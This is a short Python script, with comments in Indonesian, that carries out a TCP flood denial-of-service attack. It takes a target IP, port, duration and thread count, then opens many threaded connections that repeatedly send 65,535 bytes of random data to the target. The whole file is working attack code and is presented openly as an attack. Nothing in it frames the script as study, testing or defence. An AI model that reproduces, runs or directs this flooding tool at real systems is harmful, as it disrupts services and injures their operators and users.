#!/usr/bin/python3
import socket
import threading
import random
import sys
import time

if len(sys.argv) != 5:
    sys.exit('Usage: python3 tcp_flood.py <target_ip> <target_port> <duration_in_seconds> <threads>')

# Parameter dari input
target_ip = sys.argv[1]
target_port = int(sys.argv[2])
duration = int(sys.argv[3])  # Durasi serangan dalam detik
thread_count = int(sys.argv[4])  # Jumlah thread

# Ukuran paket
packet_size = 65535  # Maksimal ukuran paket TCP dalam bytes

# Fungsi untuk melakukan TCP Flood
def tcp_flood():
    packet = random._urandom(packet_size)  # Data acak untuk paket
    start_time = time.time()

    while time.time() - start_time < duration:
        try:
            # Membuka koneksi TCP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target_ip, target_port))
            sock.sendall(packet)  # Mengirim paket
            sock.close()
        except Exception as e:
            pass  # Abaikan error (misalnya jika target menolak koneksi)

# Membuat dan menjalankan thread
print(f"Starting TCP Flood on {target_ip}:{target_port} for {duration} seconds with {thread_count} threads...")
threads = []
for _ in range(thread_count):
    t = threading.Thread(target=tcp_flood)
    t.start()
    threads.append(t)

# Menunggu semua thread selesai
for t in threads:
    t.join()

print("TCP Flood selesai.")
